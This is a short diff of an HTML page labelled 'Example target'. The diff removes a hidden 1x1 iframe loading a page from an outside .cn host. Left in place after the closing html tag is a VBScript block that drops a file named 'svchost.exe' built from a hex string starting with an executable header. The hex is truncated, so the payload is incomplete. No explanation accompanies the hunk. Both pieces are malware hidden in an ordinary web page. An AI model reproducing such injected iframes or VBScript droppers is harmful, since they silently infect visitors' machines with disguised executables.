@@ -6,7 +6,6 @@ Example target...
 
 ...
 
-<iframe src="http://NtKrnlpa.cn/rc/" width=1 height=1 style="border:0"></iframe>
 </body></html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
 WriteData = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000..
